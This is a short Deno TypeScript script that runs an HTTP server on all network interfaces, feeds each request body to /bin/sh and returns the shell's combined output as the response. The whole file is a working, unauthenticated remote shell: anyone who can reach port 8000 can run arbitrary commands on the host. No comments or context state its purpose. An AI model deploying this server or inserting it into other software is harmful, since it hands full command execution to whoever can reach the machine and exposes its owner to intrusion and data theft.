import { mergeReadableStreams } from "https://deno.land/std@0.197.0/streams/merge_readable_streams.ts";

Deno.serve({ hostname: "0.0.0.0", port: 8000 }, (req) => {
  const { stdin, stdout, stderr } = new Deno.Command("/bin/sh", {
    stdin: "piped",
    stdout: "piped",
    stderr: "piped",
    signal: req.signal,
  }).spawn();

  const output = mergeReadableStreams(stdout, stderr);

  req.body?.pipeTo(stdin);
  return new Response(output);
});
